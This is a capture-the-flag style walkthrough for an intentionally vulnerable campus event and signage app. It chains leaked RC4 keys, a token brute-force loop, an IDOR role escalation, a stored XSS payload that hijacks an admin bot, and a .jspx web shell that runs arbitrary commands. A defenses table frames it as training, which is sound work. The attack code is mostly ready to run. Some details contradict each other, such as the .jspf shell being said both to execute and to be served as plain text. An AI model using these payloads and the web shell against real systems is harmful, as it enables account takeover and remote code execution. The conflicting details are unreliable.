# Attack Chain Walkthrough — Campus Event & Digital Signage System

> **Isolated lab only.** Everything below is intentionally vulnerable code in
> a training environment with synthetic accounts. Do not run against any
> system you do not own.

The lab enforces a strict progression. Each stage yields the credential for
the next:

```
[Stage 0] Break the transport envelope (recon)
[Stage V1] Unauthenticated ──▶ Student      (predictable activation token)
[Stage V2] Student ──▶ Organiser            (team-join IDOR)
[Stage V3] Organiser ──▶ Administrator      (stored XSS + admin review bot)
[Stage V4] Administrator ──▶ RCE            (unrestricted upload + unsafe dispatcher)
```

All API examples use `tools/rc4cli.py`, which encrypts requests and decrypts
responses:

```bash
RC="python3 tools/rc4cli.py"
APP=http://localhost:8080/campus-events
```

---

## Stage 0 — Recon: the transport envelope

Every body is wrapped in an encrypted envelope:

```bash
curl -s "$APP/login.jsp"
# <html><head><script src="campus-events/static/js/app-crypto.js">...
# document.write(window.AppCrypto.decryptDocument('<envelope>'))
```

The bootstrap loader loads `static/js/app-crypto.js` — the decryption code,
**including the key**, is shipped to every client:

```bash
curl -s "$APP/static/js/app-crypto.js" | grep KEY
#   key: "Rc4StaticKey#Campus2026",
```

The cipher is RC4 with a static key — same key for everyone, forever. Any
client can therefore read and forge every envelope. `rc4cli.py` does this
for you (that is why the later stages look like plain JSON).

There is no TLS by design: the app-level envelope *is* the only
confidentiality control, and it is broken. (Lab note: a real deployment
would still add TLS; here the exercise is that weak app-layer crypto is not
saved by assuming transport security, and transport security would not have
saved this broken design either.)

---

## Stage V1 — Unauthenticated → Student

**Flaw.** Pending accounts are activated with a token computed as
`MD5("ACTIVATE:" + studentId + ":" + creationEpochSeconds)[0:8]` — eight hex
chars, fully derivable from public data. The unauthenticated "new students"
directory conveniently publishes exactly those two inputs.

1. **Enrol a victim-in-waiting (or use the seeded pending account).** The
   seed includes `r.patel` (student id `S-1042`), stuck in `pending`. A fresh
   signup works too and appears in the same directory:

   ```bash
   $RC --data '{"action":"signup","username":"e.attacker","student_id":"S-9001","email":"e@lab.local"}' \
       api/auth
   ```

2. **Read the public directory** (no session). The directory rounds the
   registration time to the nearest hour and exposes it as
   `registered_hour_epoch` (not the exact second):

   ```bash
   $RC request api/directory/pending
   {"ok":true,"pending":[
     {"username":"r.patel","student_id":"S-1042","registered_hour_epoch":1791201600,
      "note":"Registration time approximate (within 1 hour window)"},
     {"username":"e.attacker","student_id":"S-9001","registered_hour_epoch":1791287600,
      "note":"Registration time approximate (within 1 hour window)"}, ...]}
   ```

3. **Brute-force the exact epoch and compute the token.** The actual
   registration time is somewhere in the 3,600-second window
   `[registered_hour_epoch, registered_hour_epoch + 3600)`. The formula is
   documented on the activation page itself (over-share by design):

   ```bash
   # Brute-force the exact epoch within the 1-hour window
   BASE=1791287600   # registered_hour_epoch from the directory
   for epoch in $(seq $BASE $((BASE + 3599))); do
     token=$(printf 'ACTIVATE:%s:%s' S-9001 "$epoch" | md5sum | cut -c1-8)
     result=$($RC request "api/activate?token=$token" 2>/dev/null)
     if echo "$result" | grep -q '"ok":true'; then
       echo "FOUND! epoch=$epoch token=$token"
       break
     fi
   done
   # FOUND! epoch=1791287654 token=3f7a1c9d
   ```

   (`ActivateServlet` GET `?token=...` confirms which account it resolves.)

4. **Activate and set the password:**

   ```bash
   $RC --data '{"token":"3f7a1c9d","password":"Pwned#12345"}' api/activate
   ```

5. **Log in — you now have Student:**

   ```bash
   $RC request --jar /tmp/atk.jar \
     --data '{"action":"login","username":"e.attacker","password":"Pwned#12345"}' api/auth
   {"ok":true,"redirect":"student.jsp","role":"student"}
   ```

---

## Stage V2 — Student → Organiser

**Flaw.** Joining an event team takes an invitation code. The backend only
checks that the code *exists*; the `event_id` and `role` in the request are
trusted verbatim. The published event's page/API exposes its invite code.

1. **Find an invite code** (published events list includes it):

   ```bash
   $RC request --jar /tmp/atk.jar api/events
   # event 1 "Fall Fest 2026" ... "invite_code":"INV-FALLFEST-2026"
   # published events are 1, 3-7 and 9-14 (4 "Open-Air Cinema Night" with
   # INV-CINEMA-2026, 7 "Sustainability Week Kickoff" with INV-SUSTAIN-2026,
   # the rest carry no invite code). Draft events 2 and 8 do not appear
   # in this list.
   ```

2. **Legitimate join first** (volunteer, event 1 — the intended use):

   ```bash
   $RC request --jar /tmp/atk.jar \
     --data '{"token":"INV-FALLFEST-2026","event_id":1,"role":"volunteer"}' api/team
   ```

3. **Tamper the envelope contents.** Same valid invite, different target and
   role — no server-side validation of either:

   ```bash
   $RC request --jar /tmp/atk.jar \
     --data '{"token":"INV-FALLFEST-2026","event_id":3,"role":"organiser"}' api/team
   ```

   `TeamServlet` inserts an `organiser` team row for event 3 *and* promotes
   the account itself (`UPDATE users SET role='organiser'`).

4. **Verify** — role is now organiser:

   ```bash
   $RC request --jar /tmp/atk.jar api/me     # "role":"organiser", teams include event 2
   # next login redirects to organiser.jsp
   ```

---

## Stage V3 — Organiser → Administrator (stored XSS + review bot)

**Flaw.** Organisers submit CKEditor 4 rich-text event descriptions. The
editor is configured with `allowedContent: true` (script/HTML allowed) and
the admin review page injects the stored HTML verbatim:

```js
panel.innerHTML = ... + '<div id="review-desc">' + ev.description_html + '</div>'
```

A bundled Playwright bot ("the review bot") signs in as `admin` and fully
renders every submitted event the moment it is submitted — a stand-in for a
human administrator reviewing content.

> CKEditor/`innerHTML` note: `<script>` inserted via `innerHTML` does not
> execute — use an event handler such as `<img src=x onerror=...>`.

1. **Build the payload.** It runs in the admin's session, reuses the page's
   own `AppCrypto` to forge an enveloped request to the admin-only role
   endpoint, and paints a confirmation banner so the change is visible in
   the bot's screenshot. Replace `USER_ID` with your attacker account id
   (from `api/me`):

   ```html
   <h2>Fall photography walk</h2><p>Bring your camera...</p>
   <img src=x onerror="fetch('api/admin/users',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({enc:AppCrypto.encrypt(JSON.stringify({user_id:USER_ID,role:'admin'}))})}).then(r=>r.json()).then(e=>JSON.parse(AppCrypto.decrypt(e.enc))).then(d=>{var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:9999;background:#b00020;color:#fff;padding:14px;font:600 16px sans-serif;text-align:center';b.textContent='ROLE CHANGE CONFIRMED: user #'+USER_ID+' is now admin';document.body.appendChild(b);})">
   ```

2. **Save it into your event and submit for review** (as the organiser, via
   `organiser.jsp` or the API):

   ```bash
   $RC request --jar /tmp/atk.jar --data '{"action":"save","event_id":3,
     "title":"Hackathon Night","description_html":"<PAYLOAD-ABOVE>",
     "starts_at":"2026-10-20T18:00","location":"Lab Hall B"}' api/organiser
   $RC request --jar /tmp/atk.jar --data '{"action":"submit","event_id":3}' api/organiser
   ```

   The submit action fires the webhook; the bot queues the event.

3. **Watch the bot work:**

   ```bash
   curl -s localhost:5000/status        # job done + screenshot path
   ls screenshots/                      # review-3-<timestamp>.png (bind-mounted)
   ```

   The screenshot shows the review page with the red
   **ROLE CHANGE CONFIRMED** banner — rendered by the admin's own browser.

4. **Confirm admin access:**

   ```bash
   $RC request --jar /tmp/atk.jar api/me            # "role":"admin"
   $RC request --jar /tmp/atk.jar api/admin/users   # admin-only endpoint answers
   ```

   The change is also in the admin audit log (`api/admin/audit`,
   action `role_change`) — forensics for the blue team.

---

## Stage V4 — Administrator → RCE

Two flaws combine: (a) the signage-template uploader accepts **any**
filename/bytes and writes into the web-accessible `uploads/templates/`
directory. A hard-mode filter blocks `.jsp` extensions, but `.jspx` bypasses
it — `conf/web.xml` maps `*.jsp` and `*.jspx` to Tomcat's JspServlet, so a
`.jspx` file is compiled and executed (`.jspf` also passes the upload filter
but is **not** servlet-mapped, so it is only ever served as plain text);
(b) the template preview endpoint forwards the user-supplied path straight
to `RequestDispatcher.forward()` with no canonicalisation or allow-listing,
so `..` segments walk anywhere inside the context.

1. **Upload a JSP shell** using an extension that bypasses the `.jsp`
   filter (admin UI or API). The filter only checks
   `lowerFilename.endsWith(".jsp")`, so `shell.jspx` passes through.
   Note `.jspx` is parsed as XML — classic `<% %>` scriptlets fail there;
   use the `jsp:` XML syntax with fully-qualified class names:

   ```bash
   cat > /tmp/shell.jspx <<'EOF'
   <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
   <jsp:directive.page contentType="text/plain"/>
   <jsp:scriptlet>
   java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}).getInputStream()));
   String line;
   while ((line = r.readLine()) != null) { out.println(line); }
   </jsp:scriptlet>
   </jsp:root>
   EOF
   $RC request --jar /tmp/atk.jar \
     --data "{\"filename\":\"shell.jspx\",\"content_b64\":\"$(base64 -w0 /tmp/shell.jspx)\"}" \
     api/admin/templates
   ```

2. **Execute via the vulnerable preview dispatcher.** The raw path goes
   straight to `RequestDispatcher.forward()`; leading `..` that climbs above
   the context root is rejected by Tomcat, but traversal *inside* the context
   is not canonicalised away by the app:

   ```bash
   $RC request --jar /tmp/atk.jar \
     "admin/templates/preview?path=/uploads/../uploads/templates/shell.jspx&cmd=id"
   # uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
   ```

3. **Bonus route** — because the upload directory is web-accessible, the
   shell also answers directly, no session at all:

   ```bash
   $RC request "uploads/templates/shell.jspx?cmd=id"
   # uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
   ```

---

## Defenses (what would break each stage)

| Stage | Fix |
|-------|-----|
| Envelope | TLS + authenticated encryption with per-session keys; never ship keys to clients |
| V1 | Random 128-bit+ activation tokens, single-use, expiring; don't publish directory data (rounding to the hour is not sufficient — brute-force is trivial) |
| V2 | Resolve event + permitted role from the invitation row server-side; ignore client ids |
| V3 | Sanitize rich text server-side on render (allow-list), CSP, drop `allowedContent:true`; blocking `<script>` alone is insufficient — event handlers like `<img onerror=>` also execute |
| V4 | Extension/MIME allow-list (block all executable extensions, not just `.jsp`), store uploads outside webroot, canonicalise + validate dispatcher paths |

## Troubleshooting

- **Bot did not run** — `docker compose logs bot`; check
  `curl localhost:5000/status`. Jobs only make sense for events in
  `pending_review` state; re-trigger manually with
  `curl -X POST localhost:5000/review -H 'X-Bot-Token: lab-bot-token-890d7ba8d41377626cceaa03f0ab67f1b245d8b6e57d156f66a0e7092b62f3cf' -d '{"event_id":3}'`.
- **Garbled API output** — you skipped the envelope: all body-carrying calls
  must go through `rc4cli.py` (or your own RC4 wrapper with the static key).
- **Preview returns blank** — check `docker compose logs web`; if the
  dispatcher normalized the `..` away, the direct URL
  `uploads/templates/shell.jspf?cmd=id` still works.
- **Start over** — `docker compose down -v && docker compose up --build -d`.
